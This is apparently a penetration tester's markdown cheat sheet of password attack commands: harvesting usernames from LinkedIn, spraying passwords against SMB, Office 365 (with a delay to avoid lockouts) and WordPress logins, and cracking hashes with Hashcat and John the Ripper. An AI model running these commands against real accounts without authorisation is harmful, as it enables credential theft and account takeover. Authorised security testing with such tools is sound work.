## Password Spraying
### Username Generation
- `linkedin2username your_linkedin@email.com corp -n @corp.com -o ./li2u/corp/`
### CrackMapExec
- `crackmapexec smb scope.txt -u users.txt -p passwords.txt`
### Go365
- `go365 -endpoint rst -ul users.txt -pl passwords.txt -d domain.com -w 5 -delay 1600 -o go365_domain.txt`
### WPScan
- `wpscan --url http://example.com -e u --passwords /usr/share/wordlists/pass.txt`
## Password Cracking
### Hashcat
- `hashcat -m $algorithm_number $hash $wordlist
### John The Ripper
- `john hash.txt`